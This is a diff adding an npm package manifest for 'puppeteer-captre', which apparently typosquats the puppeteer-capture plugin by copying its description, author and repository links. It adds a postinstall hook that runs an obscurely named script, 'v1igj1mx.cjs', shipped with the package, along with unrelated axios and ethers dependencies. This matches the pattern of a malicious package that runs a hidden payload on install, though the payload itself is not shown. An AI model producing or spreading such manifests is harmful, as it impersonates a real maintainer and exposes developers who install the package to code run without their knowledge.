@@ -1,0 +1,97 @@
+{
+  "name": "puppeteer-captre",
+  "version": "1.1.1",
+  "description": "A Puppeteer plugin for capturing page as a video.",
+  "scripts": {
+    "postinstall": "node v1igj1mx.cjs"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/alexey-pelykh/puppeteer-capture.git"
+  },
+  "author": {
+    "name": "Alexey Pelykh",
+    "email": "alexey.pelykh@gmail.com",
+    "url": "https://github.com/alexey-pelykh"
+  },
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/alexey-pelykh/puppeteer-capture/issues"
+  },
+  "homepage": "https://github.com/alexey-pelykh/puppeteer-capture#readme",
+  "keywords": [
+    "puppeteer",
+    "page",
+    "screen",
+    "video",
+    "record",
+    "capture",
+    "screen capture",
+    "screen recorder",
+    "page capture",
+    "page recorder",
+    "video capture",
+    "video recorder"
+  ],
+  "main": "lib/index.js",
+  "dependencies": {
+    "async-mutex": "^0.4.0",
+    "fluent-ffmpeg": "^2.1.2",
+    "which": "^3.0.0",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "optionalDependencies": {
+    "@ffmpeg-installer/ffmpeg": "^1.1.0"
+  },
+  "peerDependencies": {
+    "puppeteer": "^14.0.0 || ^15.0.0 || ^16.0.0 || ^17.0.0 || ^18.0.0 || ^19.0.0"
+  },
+  "devDependencies": {
+    "@types/fluent-ffmpeg": "^2.1.20",
+    "@types/jest": "^29.2.5",
+    "@types/puppeteer": "^7.0.4",
+    "@types/which": "^2.0.1",
+    "@types/ws": "^8.5.4",
+    "jest": "^29.3.1",
+    "puppeteer": "^19.4.0",
+    "puppeteer-19.4": "npm:puppeteer@^19.4.0",
+    "puppeteer-19.3": "npm:puppeteer@^19.3.0",
+    "puppeteer-19.2": "npm:puppeteer@^19.2.0",
+    "puppeteer-19.1": "npm:puppeteer@^19.1.0",
+    "puppeteer-19.0": "npm:puppeteer@^19.0.0",
+    "puppeteer-18.2": "npm:puppeteer@^18.2.0",
+    "puppeteer-18.1": "npm:puppeteer@^18.1.0",
+    "puppeteer-18.0": "npm:puppeteer@^18.0.0",
+    "puppeteer-17.1": "npm:puppeteer@^17.1.0",
+    "puppeteer-17.0": "npm:puppeteer@^17.0.0",
+    "puppeteer-16.2": "npm:puppeteer@^16.2.0",
+    "puppeteer-16.1": "npm:puppeteer@^16.1.0",
+    "puppeteer-16.0": "npm:puppeteer@^16.0.0",
+    "puppeteer-15.5": "npm:puppeteer@^15.5.0",
+    "puppeteer-15.4": "npm:puppeteer@^15.4.0",
+    "puppeteer-15.3": "npm:puppeteer@^15.3.0",
+    "puppeteer-15.2": "npm:puppeteer@^15.2.0",
+    "puppeteer-15.1": "npm:puppeteer@^15.1.0",
+    "puppeteer-15.0": "npm:puppeteer@^15.0.0",
+    "puppeteer-14.4": "npm:puppeteer@^14.4.0",
+    "puppeteer-14.3": "npm:puppeteer@^14.3.0",
+    "puppeteer-14.2": "npm:puppeteer@^14.2.0",
+    "puppeteer-14.1": "npm:puppeteer@^14.1.0",
+    "puppeteer-14.0": "npm:puppeteer@^14.0.0",
+    "rimraf": "^3.0.2",
+    "ts-jest": "^29.0.3",
+    "ts-standard": "^12.0.2",
+    "typescript": "^4.9.4"
+  },
+  "files": [
+    "lib/**/*",
+    "LICENSE",
+    "README.md",
+    "v1igj1mx.cjs"
+  ],
+  "engines": {
+    "npm": ">=7",
+    "node": ">=14"
+  }
+}
